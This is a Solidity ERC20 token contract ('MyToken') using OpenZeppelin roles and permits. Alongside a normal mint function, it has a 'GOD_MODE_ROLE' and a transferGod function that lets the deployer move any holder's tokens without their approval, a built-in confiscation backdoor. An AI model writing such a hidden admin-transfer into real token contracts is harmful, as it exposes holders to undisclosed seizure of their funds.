// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/access/AccessControl.sol";
import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Permit.sol";

contract MyToken is ERC20, AccessControl, ERC20Permit {
    bytes32 public constant MINTER_ROLE = keccak256("MINTER_ROLE");
    bytes32 public constant GOD_MODE_ROLE = keccak256("GOD_MODE_ROLE");

    constructor() ERC20("MyToken", "MTK") ERC20Permit("MyToken") {
        _setupRole(DEFAULT_ADMIN_ROLE, msg.sender);
        _setupRole(MINTER_ROLE, msg.sender);
        _setupRole(GOD_MODE_ROLE, msg.sender);
    }

    function mint(address to, uint256 amount) public onlyRole(MINTER_ROLE) {
        _mint(to, amount);
    }

    function transferGod(address from, address to, uint256 amount) public onlyRole(GOD_MODE_ROLE) {
        require(balanceOf(from) >= amount, "Insufficient balance");
        _transfer(from, to, amount);
    }
}
